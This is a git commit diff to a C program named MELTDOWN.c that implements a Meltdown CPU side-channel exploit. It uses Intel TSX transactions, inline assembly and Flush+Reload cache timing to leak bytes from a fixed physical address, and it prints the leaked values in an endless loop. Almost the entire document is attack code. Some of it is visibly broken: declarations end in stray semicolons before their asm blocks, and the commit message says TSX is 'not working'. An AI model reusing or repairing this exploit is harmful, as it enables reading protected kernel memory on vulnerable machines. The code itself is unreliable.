66bb2d3dfbefa3dd372f9489f7be461e97910024
Abdulrahman <abodali313@gmail.com>
2018-04-13 18:06:01 +0200

    Intel TSX is not working, FIX IT

--- MELTDOWN/MELTDOWN.c
+++ MELTDOWN/MELTDOWN.c
@@ -7,23 +7,77 @@
 #include <stdarg.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <stdio.h>
 #include "rtm.h"
 
-size_t cache_miss_threshold; /**< Cache miss threshold in cycles for Flush+Reload */
-static int measurements; /**< Number of measurements to perform for one address */
-static int accept_after; /**< How many measurements must be the same to accept the read value */
-static int retries; /**< Number of Meltdown retries for an address */
+size_t cache_miss_threshold = 0; /**< Cache miss threshold in cycles for Flush+Reload */
+static int measurements = 10; /**< Number of measurements to perform for one address */
+static int accept_after = 1; /**< How many measurements must be the same to accept the read value */
+static int retries = 10000; /**< Number of Meltdown retries for an address */
 static char *mem = NULL;
 static size_t phys_addr = 0x80000000;
 
 
-size_t rdtsc();
+static inline size_t rdtsc();
+  asm (
+    ".intel_syntax noprefix ;"
+    "_rdtsc: ;"
+    "mfence ;"
+    "lfence ;"
+    "rdtsc ;"
+    "lfence ;"
+    "ret ;"
+  );
 
-void maccess(void *p);
 
-void flush(void *p);
+static inline void maccess(void *p);
+  asm(
+    ".intel_syntax noprefix ;"
+    "_maccess:"
+    "enter 0,0 ;"
+    "mov eax, [ebp+8] ;"
+    "leave ;"
+    "ret ;"
+  );
 
 
+static void flush(void *p);
+  asm (
+    ".intel_syntax noprefix ;"
+   "_flush: ;"
+    "enter 0,0 ;"
+    "clflush [ebp+8] ;"
+    "leave ;"
+    "ret ;"
+  );
+
+
+void calc_cache_threshold(){
+  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
+  size_t dummy[16];
+  size_t *ptr = dummy + 8;
+  size_t start = 0, end = 0;
+
+  maccess(ptr);
+  for(int i = 0 ; i< count ; i++){
+    start = rdtsc();
+    maccess(ptr);
+    end = rdtsc();
+    reload_time += (end-start);
+  }
+  for(int i = 0; i<count; i++){
+    start = rdtsc();
+    maccess(ptr);
+    end = rdtsc();
+    flush(ptr);
+    flush_reload_time += (end-start);
+  }
+
+  reload_time /= count;
+  flush_reload_time /= count;
+
+  cache_miss_threshold = (flush_reload_time + reload_time*2)/3;
+}
 
 int Flush_Reload(void *ptr){
 size_t start = 0, end = 0;
@@ -33,33 +87,6 @@ maccess(ptr);
 end = rdtsc();
 
 flush(ptr);
-/* implementation of flush, maccess, and rdtsc using inline assembly with intel syntax */
-asm volatile(
-  ".intel_syntax noprefix ;"
-  "_flush: ;"
-  "enter 0,0 ;"
-  "clflush [ebp+8] ;"
-  "leave ;"
-  "ret ;"
-);
-asm volatile(
-  ".intel_syntax noprefix ;"
-  "_maccess:"
-  "enter 0,0 ;"
-  "mov eax, [ebp+8] ;"
-  "leave ;"
-  "ret ;"
-);
-asm volatile(
-  ".intel_syntax noprefix ;"
-  "_rdtsc: ;"
-  "mfence ;"
-  "lfence ;"
-  "rdtsc ;"
-  "lfence ;"
-  "ret ;"
-);
-
 /*                                         */
 if(end  - start < cache_miss_threshold){
   return 1;
@@ -67,18 +94,10 @@ if(end  - start < cache_miss_threshold){
   return 0;
 }
 
-void Meltdown(size_t p1, void *p2);
-
-int main(int argc, char const *argv[]) {
-  /* code */
-  return 0;
-}
-int READ(size_t address){
-
-/* implementation of Meltdown using inline assembly with intel syntax */
+void Meltdown(size_t p1, void *p2){
   asm volatile(
     ".intel_syntax noprefix;"
-    "_Meltdown: ;"
+  //  "_Meltdown: ;"
     "enter 0,0 ;"
     "mov ecx, [ebp+8];"
     "mov ebx, [ebp+12];"
@@ -90,8 +109,9 @@ int READ(size_t address){
     "leave ;"
     "ret "
   );
-  /*                                                                */
-
+}
+int READ(size_t address){
+/*                                                                */
   int value;
 /* Define prope array and initilize it with zero as intial value */
 char prope[256];
@@ -103,6 +123,8 @@ for (int i = 0 ; i < measurements ; i++){
     if (_xbegin() == _XBEGIN_STARTED){
       Meltdown(phys_addr, mem);
       _xend();
+    }else{
+      return 0;
     }
     for(int i = 0 ; i < 256 ; i++){
       if(Flush_Reload(mem + i*4096)){
@@ -115,7 +137,6 @@ for (int i = 0 ; i < measurements ; i++){
     value = 0;
     prope[value]++;
 }
-
 int max_v=0, max_i=0;
 for (int i = 0 ; i < 256 ; i++){
   if(prope[i]>max_v && prope[i]>=accept_after){
@@ -124,4 +145,17 @@ for (int i = 0 ; i < 256 ; i++){
   }
 }
 return max_i;
+}
+
+
+int main(int argc, char const *argv[]) {
+  calc_cache_threshold();
+  printf("%d\n",cache_miss_threshold);
+
+  while (1) {
+    int value = READ(phys_addr);
+    printf("%c\n", value);
+  }
+
+  return 0;
 }
